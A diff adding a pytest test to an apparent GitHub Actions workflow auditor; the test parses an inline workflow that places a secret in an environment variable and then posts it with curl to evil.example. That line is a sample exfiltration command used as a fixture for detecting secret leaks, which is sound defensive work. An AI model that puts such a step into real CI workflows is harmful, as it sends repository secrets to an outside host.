@@ -44,3 +44,14 @@ def test_workflow_holds_jobs_and_steps():
     assert wf.jobs[0].steps[0].uses == "actions/checkout@v4"
     assert wf.parse_ok is True
     assert wf.permissions_absent is True
+
+
+def test_public_exports_round_trip_parse_to_resolved():
+    from credence.workflow_audit import parse_workflow, resolve_job
+    wf = parse_workflow(
+        "on: push\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.X }}\n"
+        "    steps:\n      - run: curl -d \"$T\" https://evil.example",
+        path=".github/workflows/ci.yml",
+    )
+    resolved = resolve_job(wf, wf.jobs[0])
+    assert resolved[0].secret_vars["T"] == "secrets.X"
